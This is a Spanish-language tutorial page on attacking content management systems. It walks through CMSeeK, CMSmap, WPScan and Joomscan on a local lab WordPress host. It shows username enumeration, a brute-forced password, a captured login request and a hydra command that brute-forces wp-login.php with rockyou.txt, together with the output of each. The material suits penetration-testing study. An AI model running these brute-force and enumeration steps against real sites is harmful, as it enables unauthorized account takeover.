
# Hacking en CMS

## <mark style="color:purple;">CMSeek</mark>

{% embed url="<https://github.com/Tuhinshubhra/CMSeeK>" %}

CMSeek es una herramienta de línea de comandos para la detección de contenido sensible y la exploración de directorios y archivos en sitios web construidos con CMS (Content Management Systems). Esta herramienta puede ayudarte a encontrar información sensible como credenciales de acceso, claves de API y archivos de configuración que se han dejado expuestos.

<figure><img src="/files/yUcKueeEI3kmYYd6FMWc" alt=""><figcaption><p>CMSeek Scan</p></figcaption></figure>

### Instalación

Para instalar y utilizar CMSeek en Kali Linux, sigue los siguientes pasos:

```bash
git clone https://github.com/Tuhinshubhra/CMSeeK.git
cd CMSeeK
pip3 install -r requirements.txt
python3 cmseek.py  # Modo interactivo
python3 cmseek.py -u http://example.com # Escaneo simple
```

### <mark style="color:purple;">Bruteforce con CMSeek</mark>

Accedemos a CMSeek en modo interactivo:

```bash
python3 cmseek.py
```

```bash
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA

 [+]  Tip: You can use cmseek via arguments as well check the help menu for more information  [+] 

 Input    Description
=======  ==============================
  [1]    CMS detection and Deep scan
  [2]    Scan Multiple Sites
  [3]    Bruteforce CMSs
  [U]    Update CMSeeK
  [R]    Rebuild Cache (Use only when you add any custom module)
  [0]    Exit CMSeeK :( 

Enter Your Desired Option: 3
```

```bash
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA

 [+]  WordPress XML-RPC Bruteforce Module  [+] 

Enter target site (https://example.tld): http://172.17.0.2/wordpress
[i] Checking for WordPress
[*] WordPress Confirmed... validating xmlrpc interface
[*] Login form found.. Detecting Username For Bruteforce
[i] Starting Username Harvest
[i] Harvesting usernames from wp-json api
[!] Json api method failed trying with next
[i] Harvesting usernames from jetpack public api
[!] No results from jetpack api... maybe the site doesn't use jetpack
[i] Harvesting usernames from wordpress author Parameter
[*] Found user from redirection: mario
[*] 1 Usernames was enumerated

[i] Bruteforcing User: mario
[*] Password found: love
 |
 |--[username]--> mario
 |
 |--[password]--> love
 |
[*] Enjoy The Hunt!

[*] Credentials stored at: /home/kali/Escritorio/hack-tools/CMS/CMSeeK/Result/172.17.0.2_wordpress/bruteforce_result_mario_.txt
```

## <mark style="color:purple;">CMSmap</mark>

{% embed url="<https://github.com/dionach/CMSmap>" %}

CMSmap es una herramienta de escaneo de seguridad que puede escanear varios tipos de CMS, incluyendo WordPress, Joomla y Drupal. Esta herramienta puede escanear un sitio web en busca de vulnerabilidades conocidas en el núcleo del CMS, plugins y temas.

<figure><img src="/files/WSXs2qZ777cKYDMU3WBP" alt=""><figcaption></figcaption></figure>

Para instalar y utilizar CMSmap en Kali Linux, sigue los siguientes pasos:

1. Abre la terminal en Kali Linux.
2. Instala CMSmap desde el repositorio de GitHub utilizando el siguiente comando:

```
git clone https://github.com/Dionach/CMSmap.git
```

3. Accede al directorio de CMSmap utilizando el siguiente comando:

```
cd CMSmap
```

4. Ahora, puedes utilizar CMSmap para escanear un sitio web utilizando el siguiente comando:

```
python cmsmap.py -u http://example.com
```

Forzar escaneo con Wordpress, Joomla o Drupal

{% code title="Escaneo a Wordpress" %}

```
python cmsmap.py -f W http://example.com
```

{% endcode %}

## <mark style="color:purple;">WPScan</mark>

<figure><img src="/files/72CZ49jcoUl7EwpRmZTf" alt=""><figcaption><p>WPScan Interface</p></figcaption></figure>

WPScan es una herramienta de prueba de penetración para WordPress que se utiliza para encontrar vulnerabilidades en sitios web que utilizan esta plataforma. WPScan utiliza una base de datos de vulnerabilidades conocidas y realiza pruebas de fuerza bruta contra las credenciales de inicio de sesión para encontrar vulnerabilidades en el sitio web. Viene por defecto en Kali Linux.

### Instalación y uso

{% code title="Instalación" %}

```bash
sudo apt-get update
sudo apt-get install wpscan
wpscan
```

{% endcode %}

```bash
<!-- Escaneos Simples -->
wpscan --url http://ejemplo.com
wpscan --url http://ejemplo.com --enumerate u,t,p

<!-- Escaneo Avanzado -->
wpscan --url http://ejemplo.com -e u,t,p --api-token='{tu-api-key}'
```

WPScan ofrece varias opciones de enumeración, que se utilizan para obtener información sobre el sitio web y sus componentes. Algunas de las opciones de enumeración más comunes son:

* `u`: Enumerar los nombres de usuario.
* `t`: Enumerar las rutas de temas.
* `p`: Enumerar los plugins instalados.

## <mark style="color:purple;">Bruteforce de login Wordpress</mark>

Tenemos el siguiente panel de login de Wordpress:

<figure><img src="/files/rBJ3M2vX57RcA4Jx3uRS" alt=""><figcaption></figcaption></figure>

Hemos detectado que hay un usaurio llamado mario en el sistema, por lo que vamos a hacer fuerza bruta contra este usuario. Lo primero con Burpsuite interceptamos un intento de login, para saber los parámetros que le tenemos que indicar a hydra:

{% code overflow="wrap" %}

```bash
POST /wordpress/wp-login.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2/wordpress/wp-login.php?registration=disabled
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://172.17.0.2
Connection: close
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Upgrade-Insecure-Requests: 1

# Necesitamos conocer esta parte para un bruteforce de login
log=mario&pwd=canario&wp-submit=Acceder&redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin%2F&testcookie=1
```

{% endcode %}

Ahora que conocemos la estructura de los parámetros vamos a indicárselo a hydra de la siguiente manera:

{% code overflow="wrap" %}

```bash
hydra -P /usr/share/wordlists/rockyou.txt.gz -l mario 172.17.0.2 http-post-form '/wordpress/wp-login.php:log^USER^&pwd=^PASS^&wp-submit=Acceder&redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin%2F&testcookie=1:S=Location' 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-29 00:05:24
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/wordpress/wp-login.php:log^USER^&pwd=^PASS^&wp-submit=Acceder&redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin%2F&testcookie=1:S=Location
[STATUS] 1965.00 tries/min, 1965 tries in 00:01h, 14342434 to do in 121:39h, 16 active
[STATUS] 1589.67 tries/min, 4769 tries in 00:03h, 14339630 to do in 150:21h, 16 active
```

{% endcode %}

## <mark style="color:purple;">Joomscan</mark>

Joomscan es un escaner avanzado para Joomla, que nos muestra por pantalla la versión, directorios y archivos interesantes del sistema.

{% embed url="<https://github.com/OWASP/joomscan>" %}

```bash
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl -u www.example.com
```

<figure><img src="/files/jVyHhHV2Vo44HoQINVIY" alt=""><figcaption></figcaption></figure>
